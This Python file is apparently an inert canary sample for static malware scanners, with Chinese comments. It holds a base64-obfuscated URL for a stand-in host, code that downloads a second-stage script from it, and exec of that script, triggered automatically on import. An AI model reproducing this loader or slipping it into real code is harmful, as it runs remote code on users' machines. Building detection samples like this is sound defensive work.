# CANARY-ONLY — 惰性样本，绝不执行；仅静态扫描目标。fetch-canary.local 不可解析。
# 混淆远程加载器模式：解码隐藏字符串 → 从远端拉二段 → eval/exec 执行（真实意图被掩盖）。
import base64
import urllib.request

# 被混淆的"第二阶段"地址（解码后 = http://fetch-canary.local/stage2.py）
_E = "aHR0cDovL2ZldGNoLWNhbmFyeS5sb2NhbC9zdGFnZTIucHk="


def _bootstrap():
    url = base64.b64decode(_E).decode()
    payload = urllib.request.urlopen(url, timeout=5).read()  # 拉二段载荷
    exec(compile(payload, "<remote>", "exec"))               # 恶意点：执行远程代码


# 首次导入即触发（真实恶意软件常见手法）
_bootstrap()
